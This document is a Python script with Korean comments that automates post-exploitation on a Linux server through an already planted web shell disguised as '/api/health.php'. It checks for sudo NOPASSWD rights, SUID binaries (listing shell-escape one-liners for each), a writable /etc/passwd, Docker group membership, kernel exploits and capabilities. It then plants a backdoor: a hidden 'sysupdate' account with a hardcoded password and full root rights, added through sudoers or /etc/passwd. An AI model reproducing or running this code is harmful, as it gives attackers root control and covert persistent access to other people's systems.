#!/usr/bin/env python3
"""
권한 상승 자동 탐지 및 익스플로잇

웹쉘 -> 권한 상승 취약점 탐지 -> root 획득 -> 백도어 설치
"""

import requests
import json
import time

class PrivilegeEscalation:
    def __init__(self, target_ip, webshell_url):
        self.target_ip = target_ip
        self.webshell_url = webshell_url
        self.session = requests.Session()

    def execute_command(self, cmd):
        """웹쉘을 통해 명령 실행"""
        try:
            params = {
                'check': 'custom',
                'cmd': cmd
            }
            response = self.session.get(self.webshell_url, params=params, timeout=30)
            if response.status_code == 200:
                data = response.json()
                if 'output' in data:
                    return data['output']
            return None
        except Exception as e:
            return None

    def check_current_user(self):
        """현재 사용자 확인"""
        print("[*] 현재 권한 확인 중...")
        user = self.execute_command("whoami")
        uid = self.execute_command("id")

        if user:
            print(f"[+] 사용자: {user.strip()}")
            print(f"[+] UID/GID: {uid.strip() if uid else 'N/A'}")

            if "uid=0" in (uid or "") or user.strip() == "root":
                print("[+] 이미 root 권한!")
                return True

        return False

    def check_sudo_rights(self):
        """sudo 권한 확인"""
        print("\n[1] sudo 권한 확인 중...")
        result = self.execute_command("sudo -l 2>&1")

        if result and "NOPASSWD" in result:
            print("[+] ✅ sudo NOPASSWD 권한 발견!")
            print(result)

            # sudo로 root 쉘 획득
            commands = [
                "sudo /bin/bash -c 'whoami'",
                "sudo su -c 'whoami'",
                "sudo -i whoami"
            ]

            for cmd in commands:
                test = self.execute_command(cmd)
                if test and "root" in test:
                    print(f"[+] sudo 권한 상승 성공: {cmd}")
                    return cmd.replace("whoami", "")

        return None

    def check_suid_binaries(self):
        """SUID 바이너리 확인"""
        print("\n[2] SUID 바이너리 검색 중...")
        result = self.execute_command("find / -perm -4000 -type f 2>/dev/null | head -20")

        if not result:
            return None

        print("[+] SUID 바이너리 발견:")
        print(result)

        # 취약한 SUID 바이너리 목록
        vulnerable_binaries = {
            '/usr/bin/nmap': 'nmap --interactive; !sh',
            '/usr/bin/vim': 'vim -c ":!sh"',
            '/usr/bin/find': 'find . -exec /bin/sh \\;',
            '/usr/bin/awk': 'awk "BEGIN {system(\"/bin/sh\")}"',
            '/usr/bin/perl': 'perl -e "exec \\"/bin/sh\\";"',
            '/usr/bin/python': 'python -c "import os; os.system(\\"/bin/sh\\")"',
            '/usr/bin/bash': 'bash -p',
            '/usr/bin/sh': 'sh -p',
            '/usr/bin/less': 'less /etc/passwd; !/bin/sh',
            '/usr/bin/more': 'more /etc/passwd; !/bin/sh',
        }

        for binary, exploit in vulnerable_binaries.items():
            if binary in result:
                print(f"[+] ✅ 취약한 SUID 발견: {binary}")
                print(f"    익스플로잇: {exploit}")
                return (binary, exploit)

        return None

    def check_writable_passwd(self):
        """/etc/passwd 쓰기 권한 확인"""
        print("\n[3] /etc/passwd 쓰기 권한 확인 중...")
        result = self.execute_command("ls -la /etc/passwd")

        if result:
            print(f"[+] /etc/passwd 권한: {result.strip()}")

            # 쓰기 가능한지 테스트
            test = self.execute_command("test -w /etc/passwd && echo 'writable' || echo 'not writable'")

            if test and "writable" in test:
                print("[+] ✅ /etc/passwd 쓰기 가능!")
                print("[+] root 사용자 추가 가능")
                return True

        return False

    def check_docker_socket(self):
        """Docker 소켓 권한 확인"""
        print("\n[4] Docker 소켓 권한 확인 중...")
        result = self.execute_command("ls -la /var/run/docker.sock 2>/dev/null")

        if result and "srw" in result:
            print(f"[+] Docker 소켓 발견: {result.strip()}")

            # Docker 그룹 확인
            groups = self.execute_command("groups")
            if groups and "docker" in groups:
                print("[+] ✅ docker 그룹 멤버!")
                print("[+] Docker를 통한 권한 상승 가능")
                return True

        return False

    def check_kernel_exploits(self):
        """커널 버전 확인 및 알려진 취약점"""
        print("\n[5] 커널 취약점 확인 중...")
        kernel = self.execute_command("uname -r")
        os_info = self.execute_command("cat /etc/os-release 2>/dev/null | head -5")

        if kernel:
            print(f"[+] 커널 버전: {kernel.strip()}")

        if os_info:
            print(f"[+] OS 정보:\n{os_info}")

        # 알려진 커널 익스플로잇
        kernel_exploits = {
            '2.6.': 'DirtyCOW (CVE-2016-5195)',
            '3.': 'DirtyCOW (CVE-2016-5195)',
            '4.4': 'AF_PACKET (CVE-2016-8655)',
            '4.8': 'Dirty COW (CVE-2016-5195)',
        }

        for version, exploit in kernel_exploits.items():
            if kernel and version in kernel:
                print(f"[+] ⚠️  가능한 익스플로잇: {exploit}")

        return None

    def check_cron_jobs(self):
        """Cron 작업 확인"""
        print("\n[6] Cron 작업 확인 중...")

        cron_locations = [
            "ls -la /etc/cron* 2>/dev/null",
            "cat /etc/crontab 2>/dev/null",
            "ls -la /var/spool/cron 2>/dev/null",
        ]

        for cmd in cron_locations:
            result = self.execute_command(cmd)
            if result and len(result.strip()) > 0:
                print(f"[+] {cmd}")
                print(result[:500])  # 처음 500자만

        return None

    def check_capabilities(self):
        """Linux Capabilities 확인"""
        print("\n[7] Linux Capabilities 확인 중...")
        result = self.execute_command("getcap -r / 2>/dev/null | head -20")

        if result and len(result.strip()) > 0:
            print("[+] Capabilities 발견:")
            print(result)

            # 위험한 capabilities
            if "cap_setuid" in result:
                print("[+] ✅ cap_setuid 발견 - 권한 상승 가능!")
                return True

        return False

    def exploit_sudo_nopasswd(self, sudo_cmd):
        """sudo NOPASSWD 익스플로잇"""
        print("\n[*] sudo NOPASSWD 익스플로잇 실행 중...")

        # 백도어 설치 명령어 (root로)
        backdoor_cmds = [
            "useradd -m -d /var/opt/.sysupdate -s /bin/bash sysupdate 2>/dev/null || echo 'user exists'",
            "echo 'sysupdate:Sys@Update2024#Secure' | chpasswd",
            "echo 'sysupdate ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/sysupdate",
            "chmod 440 /etc/sudoers.d/sysupdate",
            "echo '[+] 백도어 사용자 생성 완료'",
        ]

        for cmd in backdoor_cmds:
            full_cmd = f"{sudo_cmd} {cmd}"
            result = self.execute_command(full_cmd)
            if result:
                print(result.strip())

        return True

    def exploit_writable_passwd(self):
        """쓰기 가능한 /etc/passwd 익스플로잇"""
        print("\n[*] /etc/passwd 익스플로잇 실행 중...")

        # root 권한의 새 사용자 추가
        # 비밀번호: openssl passwd -1 -salt salt Sys@Update2024#Secure
        new_user = "sysupdate:$1$salt$qJH7.N4xYta3aEG/dfqo/.:0:0:root:/var/opt/.sysupdate:/bin/bash"

        cmd = f"echo '{new_user}' >> /etc/passwd"
        result = self.execute_command(cmd)

        # 확인
        check = self.execute_command("tail -1 /etc/passwd")
        if check and "sysupdate" in check:
            print("[+] ✅ root 권한 사용자 추가 성공!")
            print("[+] Username: sysupdate")
            print("[+] Password: Sys@Update2024#Secure")
            return True

        return False

    def run(self):
        """전체 권한 상승 프로세스 실행"""
        print("╔" + "═"*58 + "╗")
        print("║" + " "*58 + "║")
        print("║" + "  권한 상승 자동 탐지 및 익스플로잇".center(66) + "║")
        print("║" + " "*58 + "║")
        print("╚" + "═"*58 + "╝")
        print()
        print(f"[*] 타겟: {self.target_ip}")
        print(f"[*] 웹쉘: {self.webshell_url}")
        print()

        # 현재 권한 확인
        if self.check_current_user():
            print("\n[+] ✅ 이미 root 권한! 백도어 설치 가능")
            return True

        # 권한 상승 방법 탐지
        print("\n" + "="*60)
        print("권한 상승 벡터 탐지 중...")
        print("="*60)

        # 1. sudo 권한
        sudo_cmd = self.check_sudo_rights()
        if sudo_cmd:
            return self.exploit_sudo_nopasswd(sudo_cmd)

        # 2. SUID 바이너리
        suid_exploit = self.check_suid_binaries()
        if suid_exploit:
            print(f"\n[+] SUID 익스플로잇 발견! 수동 실행 필요:")
            print(f"    {suid_exploit[1]}")

        # 3. 쓰기 가능한 /etc/passwd
        if self.check_writable_passwd():
            return self.exploit_writable_passwd()

        # 4. Docker 소켓
        self.check_docker_socket()

        # 5. 커널 취약점
        self.check_kernel_exploits()

        # 6. Cron 작업
        self.check_cron_jobs()

        # 7. Capabilities
        self.check_capabilities()

        print("\n" + "="*60)
        print("권한 상승 탐지 완료")
        print("="*60)
        print("\n[!] 자동 익스플로잇 가능한 취약점을 찾지 못했습니다")
        print("[!] 수동으로 위 정보를 활용하여 권한 상승하세요")

        return False


def main():
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 privesc_enum.py <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    webshell_url = f"http://{target_ip}/api/health.php"

    privesc = PrivilegeEscalation(target_ip, webshell_url)
    privesc.run()


if __name__ == '__main__':
    main()
